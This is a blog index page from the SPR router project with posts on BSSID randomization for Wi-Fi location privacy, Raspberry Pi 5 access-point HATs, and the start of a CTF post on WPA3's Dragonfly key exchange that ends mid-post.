<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-list-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.0.0">
<title data-rh="true">Blog | SPR</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://www.supernetworks.org/pages/blog"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" property="og:title" content="Blog | SPR"><meta data-rh="true" name="description" content="Blog"><meta data-rh="true" property="og:description" content="Blog"><meta data-rh="true" name="docusaurus_tag" content="blog_posts_list"><meta data-rh="true" name="docsearch:docusaurus_tag" content="blog_posts_list"><link data-rh="true" rel="icon" href="/pages/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://www.supernetworks.org/pages/blog"><link data-rh="true" rel="alternate" href="https://www.supernetworks.org/pages/blog" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.supernetworks.org/pages/blog" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://6J0ST5YCC4-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/pages/blog/rss.xml" title="SPR RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/pages/blog/atom.xml" title="SPR Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="SPR" href="/pages/opensearch.xml"><link rel="stylesheet" href="/pages/assets/css/styles.43d1ec03.css">
<script src="/pages/assets/js/runtime~main.19f98c2a.js" defer="defer"></script>
<script src="/pages/assets/js/main.1e112dcc.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/pages/"><div class="navbar__logo"><img src="/pages/img/logo.png" alt="Secure Programmable Router" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/pages/img/logo.png" alt="Secure Programmable Router" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">SPR</b></a><a class="navbar__item navbar__link" href="/pages/docs/intro">Documentation</a><a class="navbar__item navbar__link" href="/pages/api/0">API</a><a class="navbar__item navbar__link" href="/pages/docs/setup_guides/setup_run_spr">Setup Guide</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/pages/blog">Blog</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/spr-networks/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">SPR GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">All posts</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/bssid-randomization">BSSID Randomization</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/pi5-hardware-2024">PI5 Hats and More, Unleashing the Power of Modular Router Hardware</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/midnightsun-qualifiers-2024-dragonfly">Dragonfly Pake</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-tailscale-integration">SPR Tailscale</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/beacon-double-free-inet-wireless-daemon-CVE-2024-28084">Beacon Double Free in IWD</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/federal-focus-memory-corruption-2024">Software Safety Looks Different From The Other Side</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/isoon-wifi-exploitation-2024">What the I-Soon Leak Tells Us About WiFi Hacking</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-2024-alerts">Alerts to Improve Network Visibility</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-2023-in-review">2023 Year in Review</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-nzyme-tap">Loading an nzyme tap on SPR</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-mitmproxy">Transparent Socket Forwarding with SPR and MITMProxy</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-nexmon">Loading up nexmon on a RPI4 with SPR</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/barely-ap-surfaces">Attack Surface Reduction Research (Part 1)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/scapy-revfrag">One Weird Trick to fix your CTF Payloads</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/virtual-spr-1click">How to use the SPR 1-click install on DigitalOcean</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/ios-app-released">SPR Now Available on the iOS App Store</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/barely-ap">Barely AP is Almost an Access Point</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr-turtles-march">March 2023&#x27;s Turtles Challenge</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/january-2023-turtles">January 2023&#x27;s Turtles Challenge</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance">Run Virtual SPR on a Google Cloud Free Tier Instance</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/virtual-spr-on-a-aws-micro-tier-instance">Run Virtual SPR on a AWS Micro Tier Instance</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/virtual-spr-on-a-digital-ocean-droplet">Run Virtual SPR on a DigitalOcean Droplet</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/virtual SPR">SPR in the cloud</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/secure router chaining">Securely Chaining Routers</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/multipsk and wpa3">SPR Supports WPA3 with Multiple Passwords</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/wifi6">Gigabit WiFi with SPR &amp; The 4x4 MT7915</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/spr_mini_pc">Running SPR on a Mini PC with WiFi 6</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/UI Push">Supernetworks just Released a React User Interface</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/pages/blog/first-blog-post">Announcing The SPR Project</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="https://schema.org/Blog"><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="How Does WiFi Location Positioning &amp; Tracking Work?"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/bssid-randomization">BSSID Randomization</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-05-31T00:00:00.000Z" itemprop="datePublished">May 31, 2024</time> · <!-- -->3 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-does-wifi-location-positioning--tracking-work">How Does WiFi Location Positioning &amp; Tracking Work?<a href="#how-does-wifi-location-positioning--tracking-work" class="hash-link" aria-label="Direct link to How Does WiFi Location Positioning &amp; Tracking Work?" title="Direct link to How Does WiFi Location Positioning &amp; Tracking Work?">​</a></h2>
<p>All Apple Smartphones and Laptops as well as Google Devices passively collect Access Point Names (the SSID) and their hardware address (the BSSID), and they then tag it with the GPS location. With billions of customers, tech giants have been able to build databases that contain the physical position of almost every access point in the world.</p>
<p>Researchers from the University of Maryland published that the privacy features in the public APIs were insufficient to protect the privacy of individuals.
<a href="https://www.cs.umd.edu/~dml/papers/wifi-surveillance-sp24.pdf" target="_blank" rel="noopener noreferrer">See the paper from Erik Rye, Dave Levin for the details: &quot;Surveilling the Masses with Wi-Fi-Based Positioning Systems&quot; </a></p>
<p>Krebs On Security has a through review of the issue: <a href="https://krebsonsecurity.com/2024/05/why-your-wi-fi-router-doubles-as-an-apple-airtag/" target="_blank" rel="noopener noreferrer">&quot;Why Your Wi-Fi Router Doubles as an Apple AirTag&quot;</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-impact-on-privacy">What Is the Impact On Privacy?<a href="#what-is-the-impact-on-privacy" class="hash-link" aria-label="Direct link to What Is the Impact On Privacy?" title="Direct link to What Is the Impact On Privacy?">​</a></h2>
<p>When traveling, access points will reveal their updated location to the general public, who can query the APIs and trick them to reveal location information. It also means that this feature could be used to stalk someone if knowing the SSID and BSSID of their router, to find their new location after they move homes for example. Apple and Google have since added some hardening to help mitigate the attack but the risks still largely remain.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-does-this-data-look-like">What does this data look like?<a href="#what-does-this-data-look-like" class="hash-link" aria-label="Direct link to What does this data look like?" title="Direct link to What does this data look like?">​</a></h2>
<p>The BSSID and SSID data is not private and available in Beacons and Probe Responses, which end up in the data used by Apple and Google to collect positioning information.</p>
<p><img loading="lazy" alt="image" src="/pages/assets/images/wireshark-bssid-rand-e93c539fd22ae27bfd8b92e82b27b008.png" width="1572" height="850" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-bssid-randomization">What is BSSID Randomization?<a href="#what-is-bssid-randomization" class="hash-link" aria-label="Direct link to What is BSSID Randomization?" title="Direct link to What is BSSID Randomization?">​</a></h2>
<p>BSSID Randomization is assigning a random MAC address to the Access Point.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-enable-bssid-randomization">Why Enable BSSID Randomization?<a href="#why-enable-bssid-randomization" class="hash-link" aria-label="Direct link to Why Enable BSSID Randomization?" title="Direct link to Why Enable BSSID Randomization?">​</a></h2>
<p>When this happens, the position databases no longer link an access point between locations. The databases can not be queried with only the SSID Name, so the position of the AP will be protected.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-_nomap-isnt-enough-">Why _nomap Isn&#x27;t Enough ?<a href="#why-_nomap-isnt-enough-" class="hash-link" aria-label="Direct link to Why _nomap Isn&#x27;t Enough ?" title="Direct link to Why _nomap Isn&#x27;t Enough ?">​</a></h2>
<p>Apple and Google have added a feature, where if the SSID name has &quot;_nomap&quot; appended in the name, they will not include it in their database. This does not prevent companies that want to collect this information from collecting it anyway. It&#x27;s also unrealistic for users to change their SSID name because they have to reconfigure all of their devices, which is a non-starter for most people with busy lives.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="how-to-enable-bssid-randomization-with-spr-">How to Enable BSSID Randomization with SPR ?<a href="#how-to-enable-bssid-randomization-with-spr-" class="hash-link" aria-label="Direct link to How to Enable BSSID Randomization with SPR ?" title="Direct link to How to Enable BSSID Randomization with SPR ?">​</a></h2>
<p>In the 3.13 release we have added a UI option to randomize the MAC address on startup. This supports both APs and interfaces working as wireless clients for internet uplink. It will assign a random address using the specified locally administered OUI bit. A user can also pick a common OUI from common-place routers to cloak with instead.</p>
<p><img loading="lazy" alt="image" src="/pages/assets/images/bssid-rand-dd3563dde347f9b544b3363ba1877a7a.png" width="1312" height="966" class="img_ev3q"></p>
<h2></h2></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/wifi-positioning">wifi positioning</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/privacy">privacy</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/tracking">tracking</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/apple">apple</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/google">google</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="Modular Router Hardware"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/pi5-hardware-2024">PI5 Hats and More, Unleashing the Power of Modular Router Hardware</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-05-08T00:00:00.000Z" itemprop="datePublished">May 8, 2024</time> · <!-- -->4 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><div style="display:flex;justify-content:center;align-items:center"><img src="/pages/assets/images/logopuzzle-02d5bc1d39938265e169b7df32ba4f65.png" style="width:50%"></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="modular-router-hardware">Modular Router Hardware<a href="#modular-router-hardware" class="hash-link" aria-label="Direct link to Modular Router Hardware" title="Direct link to Modular Router Hardware">​</a></h2>
<p>I&#x27;m excited to announce that Supernetworks will be releasing Compute Module based and Pi5 Expansion HAT based access points. The HATs and Compute Modules are expected to be generally available this summer.</p>
<p>The second tenant of Sustainability is Reuse. Companies like <a href="https://frame.work/" target="_blank" rel="noopener noreferrer">Framework</a> have been spearheading the charge towards a better form of computing by building upgradable laptops and soon other devices.</p>
<p>With what the Raspberry Pi Foundation offers people, we are able to bring some of the benefits of modular computing to Access Points as well. Modularity takes ownership one step further, letting people reuse the hardware for other projects, and upgrade it to make it powerful, without any soldering required.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-raspberry-pis-rock">Why Raspberry Pis Rock<a href="#why-raspberry-pis-rock" class="hash-link" aria-label="Direct link to Why Raspberry Pis Rock" title="Direct link to Why Raspberry Pis Rock">​</a></h2>
<p>For us it&#x27;s been easy to admire the Raspberry Pi community in particular. They&#x27;re not perfect, but across the board,
these devices all the way from Wales are highly capable. With the support of the community, Ubuntu, and many other people, software support for them is generally good for quality, security, and keeping current with the innovation that happens on Linux every single day.</p>
<p>When we started building Supernetworks, people on forums would say PIs even with adapters would be too slow for a router and can&#x27;t push past 100mbps, but we quickly found that to be nonsense, and were able to max out USB3 dongles for speeds over 650 Mbps with WiFi 5 and hit line speed (1Gbps) over the built-in ethernet as well as a USB3 Ethernet adapter. With WiFi 6 dongles, the speeds got even faster. All it took was some IRQ balancing to keep packet processing, USB3, and the built-in ethernet from thrashing the same core on interrupts. The dongles are key because although the PIs have a built-in wifi card, it does not make a great Access Point. At the time the built in card was missing WPA3 support, still has a limited internal antenna, and still today has no support for AP/VLAN for isolation.</p>
<p>One of the key limitations of using only a single USB3 WiFi dongle is that it is single-band. With the PI5 and HATs we can address this.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-pi5-hats">The PI5 Hats<a href="#the-pi5-hats" class="hash-link" aria-label="Direct link to The PI5 Hats" title="Direct link to The PI5 Hats">​</a></h2>
<p>Together with design firms we&#x27;ve been able to iterate with PI5s to turn them into dual-band/tri-band devices. The Pi5 HATs allow expanding a PI5 with PCI Express to add devices. To fully power Mediatek MT7915/6 cards we needed a custom HAT that could drive more power.</p>
<p><img loading="lazy" alt="PI5 Hat" src="/pages/assets/images/pi5hatA-c7ba0e20a6545ba0bb2349771804e827.png" width="1024" height="815" class="img_ev3q"></p>
<p>The HATs sit on top of the Pi5 and connect over the GPIO pins for power and the FPC cable for PCI.</p>
<p><img loading="lazy" alt="PI5 Pod" src="/pages/assets/images/pi5podpic-ddab06ff59314c134ae8cc429742a66a.jpg" width="1510" height="1118" class="img_ev3q"></p>
<p>Together with the MT7916 cards this makes the Pi5 into a highly capable dual-band access point, with one of the bands potentially being 6ghz. With an additional USB dongle it is possible to run the Pi5 as a tri-band router.  We&#x27;ve been able to fully saturate all three bands. It&#x27;s only when a 160Mhz channel is used (with speeds over 1 Gpbs) that we start to see I/O tuning matter for maintaining full bandwidth across USB3 and the mPCIE wifi card simultaneously.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="speed-tests-show-off-pi5-io">Speed Tests Show Off Pi5 I/O<a href="#speed-tests-show-off-pi5-io" class="hash-link" aria-label="Direct link to Speed Tests Show Off Pi5 I/O" title="Direct link to Speed Tests Show Off Pi5 I/O">​</a></h2>
<p>On the Pi5s we&#x27;re actually seeing the best speeds we&#x27;ve ever seen with the MT7916 cards.</p>
<p><img loading="lazy" alt="Speed" src="/pages/assets/images/combospeed-e28f69fb89e269cd1fe4940903cb8592.png" width="1012" height="1078" class="img_ev3q"></p>
<p>Not bad for a package that fits in the palm of your hand.</p>
<p>The image on the left represents a bandwidth test using the built-in ethernet for uplink.
The image on the right represents a bandwidth test with only wifi as the built-in ethernet tops out at 1Gbps.</p>
<p>Using an AX210 card on an intel laptop instead of the iPhone 15, to connect to the Pi5, we&#x27;ve seen 160 MHz connection throughput momentarily top out at 1.9Gbps  over TCP, from close range.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="next-steps">Next Steps<a href="#next-steps" class="hash-link" aria-label="Direct link to Next Steps" title="Direct link to Next Steps">​</a></h2>
<p>The HAT enables Raspberry Pi 5s to achieve impressive wifi throughput and full coverage for wifi bands. While we scale up production, we&#x27;re also finishing up wifi enclosures. We have an <a href="https://docs.google.com/forms/d/1rO-MQ1rLbe3qI4wav2FWSNIbFzKI3Md3hMPRY4YPTr8/edit?usp=forms_home&amp;ths=true" target="_blank" rel="noopener noreferrer">interest form</a> if you&#x27;d like to stay posted on updates. You can also <a href="https://www.supernetworks.org/hat.html" target="_blank" rel="noopener noreferrer">preorder a HAT today</a></p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/pi-5">pi5</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/raspberry">raspberry</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/pages/blog/tags/hardware">hardware</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="Midnight Sun Qualifiers 2024"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/pages/blog/midnightsun-qualifiers-2024-dragonfly">Dragonfly Pake</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2024-04-22T00:00:00.000Z" itemprop="datePublished">April 22, 2024</time> · <!-- -->7 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://twitter.com/defendtheworld" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">Alex Radocea</span></a></div></div></div></div></div></header><div class="markdown" itemprop="articleBody"><h2 class="anchor anchorWithStickyNavbar_LWe7" id="midnight-sun-qualifiers-2024">Midnight Sun Qualifiers 2024<a href="#midnight-sun-qualifiers-2024" class="hash-link" aria-label="Direct link to Midnight Sun Qualifiers 2024" title="Direct link to Midnight Sun Qualifiers 2024">​</a></h2>
<p>Over the weekend a ctf team I help with, <a href="https://hackingforsoju.team/" target="_blank" rel="noopener noreferrer">HackingForSoju</a>, hosted the Midnight Sun CTF Qualifiers.
The finals will take place in <a href="https://conf.midnightsunctf.com/" target="_blank" rel="noopener noreferrer">Stockholm, Sweden on June 14-16</a>.</p>
<p>I put together a <a href="https://gist.github.com/lts-rad/a557f5eb2d4456bbe209d524bdfbfd23" target="_blank" rel="noopener noreferrer">challenge</a> around WPA3&#x27;s Password Authenticated Key Exchange: <a href="https://datatracker.ietf.org/doc/html/rfc7664" target="_blank" rel="noopener noreferrer">Dragonfly</a></p>
<p>WPA3 has quite a few notes during our our wifi training where we discuss the background to the protocol, because it was so very worrisome from the start.</p>
<p><img loading="lazy" alt="trouble" src="/pages/assets/images/wpa3trouble-d0ed718a7ac2fb3aa54ae6b7f8c6253c.png" width="1572" height="1606" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-troubled-pake">A Troubled PAKE<a href="#a-troubled-pake" class="hash-link" aria-label="Direct link to A Troubled PAKE" title="Direct link to A Troubled PAKE">​</a></h2>
<p>In 2013, when Dan Harkins first proposed Dragonfly many people pointed out that it was
inferior to existing PAKEs. Arguably it did not steer clear of existing patents, its performance was quite bad,
and very objectively it suffered terribly from sidechannels. It does not take great skill to spot them.</p>
<p>There&#x27;s an IETF thread thread sums it up <a href="https://mailarchive.ietf.org/arch/msg/tls/A_SfHI4BsdAi4miklBs3TvUbu-Y/" target="_blank" rel="noopener noreferrer">here</a>.
Trevor Perrin, who is behind the Double Ratchet in Signal designed with Moxie Marlinspike, sums up what cryptographers saw.</p>
<p>In response, Dan Harkins goes on the offensive with personal attacks, saying several things of this nature:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt; It makes little sense to use a 1024-bit FFC group in any circumstances</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt; because (pardon me, Kevin) - fuck the NSA.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  That certainly is a fashionable pose to strike these days!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  But I brought up binding a 1024-bit FFC to a password because that&#x27;s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">what an RFC with your name on it does. So it makes sense to replace</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&quot;the NSA&quot; in your sentence with &quot;Trevor Perrin&quot;.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-- Dan Harkins</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>When the designer of a security algorithm finds it acceptable to behave this way,
and the decision makers rubber stamp their actions, we should probably take a step back
as a society and ask if irrational people should be the ones solving and creating the
math problems that our security relies on.</p>
<p>So when the WiFi consortium used Dragonfly for WPA3 in 2018, many people were actually surprised,
since they assumed Dragonfly would never make its way into widespread usage.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dragonblood">Dragonblood<a href="#dragonblood" class="hash-link" aria-label="Direct link to Dragonblood" title="Direct link to Dragonblood">​</a></h2>
<p>As WPA3 entered the ecosystem, security experts started looking. In 2019 the world&#x27;s leading wifi security expert,
Mathy Vanhoef, with Eyal Ronen, demolished Dragonfly <a href="https://wpa3.mathyvanhoef.com/" target="_blank" rel="noopener noreferrer">https://wpa3.mathyvanhoef.com</a>.
